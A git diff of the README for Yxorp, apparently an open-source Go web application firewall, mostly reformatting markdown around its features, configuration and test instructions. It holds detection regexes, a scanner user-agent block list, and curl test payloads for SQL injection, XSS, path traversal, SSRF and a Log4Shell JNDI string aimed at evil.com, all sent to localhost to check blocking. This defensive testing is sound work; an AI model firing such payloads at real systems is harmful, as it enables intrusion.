@@ -11,7 +11,9 @@
 ## 🚀 Features
 
 ### Core Security
+
 - **40+ WAF Rules** - Comprehensive protection against OWASP Top 10 threats:
+
   - SQL Injection (SQLi)
   - Cross-Site Scripting (XSS)
   - Path Traversal
@@ -31,11 +33,13 @@
 - **Circuit Breaker** - Prevents cascading failures (5 failures → 30s timeout)
 
 ### Load Balancing & High Availability
+
 - **Round-Robin Load Balancing** - Distribute traffic across multiple backends
 - **Health Checks** - Automatic backend monitoring every 10 seconds
 - **Automatic Failover** - Traffic rerouted to healthy backends instantly
 
 ### Performance & Reliability
+
 - **Gzip Compression** - Automatic response compression
 - **Request Tracing** - Unique X-Request-ID for every request
 - **Graceful Shutdown** - Zero downtime deployments
@@ -43,15 +47,18 @@
 - **Session Persistence** - Cookie forwarding for stateful applications
 
 ### Security Headers
+
 Automatically injects industry-standard security headers:
+
 - `Strict-Transport-Security` (HSTS)
 - `X-Frame-Options: DENY`
 - `X-XSS-Protection`
 - `X-Content-Type-Options: nosniff`
 
 ### Observability
+
 - **Real-Time Dashboard** - Beautiful dark-themed monitoring UI
-  
+
   ![Dashboard Screenshot](screenshots/dashboard.png)
 
 - **Live Traffic Logs** - See every request in real-time
@@ -69,6 +76,7 @@ Automatically injects industry-standard security headers:
   - `/debug/vars` - Expvar metrics
 
 ### Configuration
+
 - **Hot Reload** - Update rules without restarting (10-second interval)
 - **YAML Configuration** - Human-readable config files
 - **TLS/HTTPS Support** - SSL certificate configuration
@@ -79,6 +87,7 @@ Automatically injects industry-standard security headers:
 ## 📦 Installation
 
 ### Prerequisites
+
 - Go 1.21 or higher
 - Git
 
@@ -97,6 +106,7 @@ go run cmd/waf/main.go
 ```
 
 The WAF will start on:
+
 - **Port 8080** - Main proxy server
 - **Port 8081** - Metrics & Dashboard
 
@@ -115,9 +125,9 @@ server:
   # key_file: "certs/server.key"
 
 proxy:
-  targets: 
+  targets:
     - "https://your-backend.com"
-    - "https://backup-backend.com"  # Optional: Add more for load balancing
+    - "https://backup-backend.com" # Optional: Add more for load balancing
 
 security:
   block_user_agents:
@@ -125,20 +135,20 @@ security:
     - "sqlmap"
     - "Metasploit"
     # Add more scanner tools...
-  
+
   rate_limit:
     enabled: true
     requests_per_minute: 100
-  
+
   rules:
     - name: "SQL Injection Prevention"
       pattern: "(UNION SELECT|DROP TABLE|' OR 1=1)"
       location: "query_params"
-    
+
     - name: "XSS Prevention"
       pattern: "(<script|<iframe|onerror=|javascript:)"
       location: "query_params"
-    
+
     # 38+ more rules included...
 ```
 
@@ -162,42 +172,49 @@ curl "http://localhost:8080/?id=1' OR 1=1--"
 ### Attack Scenarios
 
 **SQL Injection**
+
 ```bash
 curl "http://localhost:8080/?user=admin' UNION SELECT * FROM users--"
 # Expected: 403 Forbidden
 ```
 
 **XSS Attack**
+
 ```bash
 curl "http://localhost:8080/?search=<script>alert(1)</script>"
 # Expected: 403 Forbidden
 ```
 
 **Path Traversal**
+
 ```bash
 curl "http://localhost:8080/../../etc/passwd"
 # Expected: 403 Forbidden
 ```
 
 **Log4Shell**
+
 ```bash
 curl "http://localhost:8080/?param=\${jndi:ldap://evil.com/a}"
 # Expected: 403 Forbidden
 ```
 
 **SSRF**
+
 ```bash
 curl "http://localhost:8080/?url=http://127.0.0.1"
 # Expected: 403 Forbidden
 ```
 
 **Scanner Detection**
+
 ```bash
 curl -A "sqlmap/1.0" http://localhost:8080/
 # Expected: 403 Forbidden
 ```
 
 **Rate Limiting**
+
 ```bash
 # Send 150 requests
 for i in {1..150}; do curl http://localhost:8080/; done
@@ -225,6 +242,7 @@ Access the real-time monitoring dashboard at `http://localhost:8081/dashboard`
 ![Dashboard Overview](screenshots/dashboard-overview.png)
 
 **Features:**
+
 - Live traffic table with color-coded status
 - Real-time request rate graph
 - Response status distribution chart
@@ -261,6 +279,7 @@ Access the real-time monitoring dashboard at `http://localhost:8081/dashboard`
 ```
 
 **Middleware Chain:**
+
 1. Recovery (Panic handler)
 2. Request ID injection
 3. Security headers
@@ -278,14 +297,14 @@ Access the real-time monitoring dashboard at `http://localhost:8081/dashboard`
 
 Yxorp includes 40 pre-configured security rules covering:
 
-| Category | Rules |
-|----------|-------|
-| Injection Attacks | SQL, NoSQL, LDAP, XPath, Command, OGNL, EL |
-| XSS | Script tags, Event handlers, CSS injection |
-| File Security | Path traversal, File upload, Info disclosure |
-| Deserialization | PHP, Java, Python object injection |
-| CVEs | Log4Shell, Spring4Shell, ShellShock |
-| Other | SSRF, XXE, SSTI, Open redirect, Mass assignment |
+| Category          | Rules                                           |
+| ----------------- | ----------------------------------------------- |
+| Injection Attacks | SQL, NoSQL, LDAP, XPath, Command, OGNL, EL      |
+| XSS               | Script tags, Event handlers, CSS injection      |
+| File Security     | Path traversal, File upload, Info disclosure    |
+| Deserialization   | PHP, Java, Python object injection              |
+| CVEs              | Log4Shell, Spring4Shell, ShellShock             |
+| Other             | SSRF, XXE, SSTI, Open redirect, Mass assignment |
 
 See [configs/rules.yaml](configs/rules.yaml) for complete list.
 
@@ -443,23 +462,26 @@ MIT License - see [LICENSE](LICENSE) file
 ### Running Locally
 
 1.  **Install Dependencies**:
+
     ```bash
     go mod tidy
     ```
 
 2.  **Run the Application**:
+
     ```bash
     go run ./cmd/waf
     ```
 
 3.  **Test**:
-    *   **Normal Request**: `curl http://localhost:8080`
-    *   **Blocked Request (SQLi)**: `curl "http://localhost:8080/?q=UNION SELECT"`
-    *   **Metrics**: Open `http://localhost:8081/debug/vars` in your browser.
+    - **Normal Request**: `curl http://localhost:8080`
+    - **Blocked Request (SQLi)**: `curl "http://localhost:8080/?q=UNION SELECT"`
+    - **Metrics**: Open `http://localhost:8081/debug/vars` in your browser.
 
 ### Running with Docker
 
 1.  **Build the Image**:
+
     ```bash
     docker build -t yxorp .
     ```
@@ -471,12 +493,12 @@ MIT License - see [LICENSE](LICENSE) file
 
 ## Architecture
 
-*   **cmd/waf**: Application entrypoint.
-*   **internal/config**: Configuration loading.
-*   **internal/middleware**: Security, Logging, Rate Limiting, Metrics, Recovery.
-*   **internal/proxy**: Reverse Proxy implementation.
-*   **internal/rules**: Regex-based threat detection engine.
-*   **internal/server**: HTTP Server lifecycle.
+- **cmd/waf**: Application entrypoint.
+- **internal/config**: Configuration loading.
+- **internal/middleware**: Security, Logging, Rate Limiting, Metrics, Recovery.
+- **internal/proxy**: Reverse Proxy implementation.
+- **internal/rules**: Regex-based threat detection engine.
+- **internal/server**: HTTP Server lifecycle.
 
 ## License
 
